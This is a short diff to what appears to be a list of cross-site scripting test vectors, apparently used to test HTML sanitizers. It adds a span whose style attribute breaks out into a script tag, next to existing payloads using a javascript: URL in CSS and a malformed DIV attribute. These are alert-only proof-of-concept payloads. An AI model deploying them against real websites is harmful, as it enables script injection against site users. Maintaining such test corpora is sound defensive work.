@@ -4,3 +4,5 @@
 <DIV STYLE="background-image: url(javascript:(1) && ('XSS9'))">x</div>
 
 <DIV """><SCRIPT>alert("XSS")</SCRIPT>">test</DIV>
+
+<span style='"><script>alert("XSS")</script>'>d</span>
